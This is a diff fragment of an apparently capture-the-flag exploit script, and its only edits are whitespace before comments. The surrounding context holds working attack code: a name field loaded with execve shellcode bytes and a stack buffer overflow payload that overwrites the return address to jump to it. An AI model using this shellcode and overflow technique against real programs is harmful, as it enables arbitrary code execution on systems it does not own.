@@ -10,7 +10,7 @@ name = '\xbf\x01\x01\x01\x01\x81\xf7\xb2\x11\x61\x01\x31\xd2\x31\xf6\xb0\x3b\x0f
 r.sendline(name)
 
 r.recvuntil('PIN: ')
-r.sendline('AAAA')			# pin
+r.sendline('AAAA')		# pin
 
 r.recvuntil('quit\n')
 r.sendline('d')
@@ -18,7 +18,7 @@ r.sendline('d')
 # BOF
 r.recvuntil('PIN: ')
 payload = ''
-payload += 'A' * 17			# pin+dummy
+payload += 'A' * 17		# pin+dummy
 payload += p64(NAME_OFFSET)	# return address
 r.sendline(payload)
 
